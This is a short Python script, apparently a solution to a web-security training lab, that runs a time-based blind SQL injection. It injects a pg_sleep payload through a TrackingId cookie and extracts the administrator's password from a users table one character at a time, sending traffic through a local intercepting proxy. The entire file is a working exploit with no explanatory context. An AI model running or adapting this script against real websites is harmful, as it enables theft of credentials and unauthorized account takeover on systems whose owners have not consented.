import requests
import sys
import urllib3
import urllib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080'}


def sqli_password(url):
    password_extracted = ""
    for i in range (1,21): 
        for j in range(32,126): 
            sqli_payload = "' || (SELECT CASE WHEN (username='administrator' AND ascii(SUBSTRING(password,%s,1))='%s') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users)--" % (i,j) 
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
            cookie = {'TrackingId': "JzfXec0Cu5dQQN9k" + sqli_payload_encoded, 'session': 'WIov1xwlPDny1VmSRYXO7SdUXDn9Th5f'}
            r = requests.get(url, cookies=cookie, verify=False, proxies=proxies)
            
        
            if int(r.elapsed.total_seconds()) > 4:
                password_extracted += chr(j) 
                sys.stdout.write('\r' + password_extracted)  
                sys.stdout.flush() 
                break
            else:
                sys.stdout.write('\r' + password_extracted + chr(j))
                sys.stdout.flush()



def main():
    if len(sys.argv) != 2:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])


    url = sys.argv[1]
    print("[+] Retrieving administrator password...")
    sqli_password(url)


if __name__ == "__main__":
    main()